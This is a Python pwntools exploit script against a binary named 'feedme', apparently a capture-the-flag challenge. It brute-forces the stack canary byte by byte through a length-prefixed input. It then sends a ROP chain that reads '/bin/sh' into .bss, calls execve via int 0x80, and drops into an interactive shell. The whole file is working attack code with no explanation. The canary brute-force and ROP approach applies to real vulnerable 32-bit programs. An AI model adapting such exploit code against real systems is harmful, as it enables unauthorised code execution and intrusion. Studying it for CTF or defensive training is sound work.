#!/usr/bin/env python
from pwn import *

def feed(data):
    s.send(chr(len(data)))
    s.send(data)

if __name__ == '__main__':
    s = process('./feedme')

    elf = ELF('./feedme')

    int0x80 = 0x8049761
    pop_eax = 0x80bb496
    pop_ebx = 0x80481c9
    pop_edx = 0x806f34a
    lea_ecx_edx = 0x80e7bfa
    pop2ret = 0x804838d
    readn = 0x8048e7e

    payload = 'A' * 0x20
    for i in range(4):
        for j in range(0x100):
            feed(payload + chr(j))
            s.recvuntil('...\n')
            if s.recvline(False).startswith('YUM'):
                payload += chr(j)
                break

    payload += 'A' * 0xc

    payload += p32(readn)
    payload += p32(pop2ret)
    payload += p32(elf.bss(0x500)) + p32(8)

    payload += p32(pop_eax) + p32(0xb)
    payload += p32(pop_ebx) + p32(elf.bss(0x500))
    payload += p32(pop_edx) + p32(0)
    payload += p32(lea_ecx_edx)
    payload += p32(int0x80)
    feed(payload)
    s.send('/bin/sh\0')
    s.recvuntil('...\n')
    s.interactive()
